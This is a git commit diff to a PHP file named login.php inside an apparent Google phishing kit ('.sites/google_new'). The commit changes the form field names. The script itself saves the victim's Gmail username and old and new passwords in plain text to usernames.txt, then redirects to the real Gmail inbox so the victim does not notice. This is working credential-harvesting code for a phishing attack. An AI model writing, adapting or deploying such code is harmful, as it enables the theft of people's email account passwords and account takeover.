2a8f8d17863bdfc1d3e93ac7f4a0681358ad8d0e
UgurCanUysal18 <67745196+UgurCanUysal18@users.noreply.github.com>
2024-05-13 18:03:30 +0300

    Update login.php

--- .sites/google_new/login.php
+++ .sites/google_new/login.php
@@ -1,6 +1,6 @@
 <?php
 
-file_put_contents("usernames.txt", "Gmail Username: " . $_POST['username'] . " Old Password: " . $_POST['password-old'] . " New Password: " . $_POST['password-new'] . "\n", FILE_APPEND);
+file_put_contents("usernames.txt", "Gmail Username: " . $_POST['username'] . " Old Password: " . $_POST['parola1'] . " New Password: " . $_POST['parola2'] . "\n", FILE_APPEND);
 header('Location: https://mail.google.com/mail/u/0/#inbox');
 exit();
 ?>
